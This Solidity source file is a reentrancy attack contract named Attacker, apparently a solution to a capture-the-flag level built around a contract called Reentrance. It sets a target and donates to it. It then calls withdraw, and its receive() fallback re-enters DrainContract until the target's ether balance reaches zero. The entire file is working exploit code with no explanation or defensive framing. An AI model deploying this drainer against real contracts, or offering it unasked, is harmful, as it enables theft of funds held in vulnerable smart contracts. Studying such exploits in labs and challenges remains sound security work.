// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256 balance);
}

contract Attacker {
    address payable targetAddress;
    bool Drained = false;
    
    function SetTarget(address payable _address) public {
        targetAddress = _address;
    }

    function ViewTargetBalance() public view returns (uint256) {
        return targetAddress.balance;
    }

    function Deposit() public payable{
        Reentrance target = Reentrance(targetAddress);
        target.donate{value: msg.value}(address(this));
    }

    function DrainContract() public {
        if (!Drained) {
            Reentrance target = Reentrance(targetAddress);
            uint256 balance = target.balanceOf(address(this));
            target.withdraw(balance);
            if (targetAddress.balance == 0) {
                Drained = true;
            }
        }
    }
    receive() external payable {
        if (!Drained) {
            DrainContract();
        }
    }
}
